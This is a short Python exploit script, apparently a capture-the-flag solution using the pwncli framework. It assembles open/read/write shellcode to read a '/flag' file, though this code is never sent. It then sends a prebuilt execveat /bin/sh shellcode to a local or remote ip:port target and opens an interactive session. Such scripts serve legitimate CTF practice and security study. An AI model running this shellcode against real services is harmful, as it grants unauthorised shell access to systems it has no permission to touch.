#!/usr/bin/env python3
# Date: 2025-07-06 09:54:27
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


rl()
bss = 0x404800
code = asm(
    '''
    /* open('/flag', 0, 0) */
    mov rax, 2
    mov rdi, 0x404100
    mov rsi, 0
    mov rdx, 0
    syscall

    /* read(3 , 0x404800, 100) */
    mov rax, 0
    mov rdi, 3
    mov rsi, 0x404800
    mov rdx, 100
    syscall


    /* write(1 , 0x404800, 100) */
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x404800
    mov rdx, 100
    syscall

    '''
)

code=code.ljust(0x60,b'\x00')
code+=b'/flag'
s(ShellcodeMall.amd64.execveat_bin_sh)

ia()
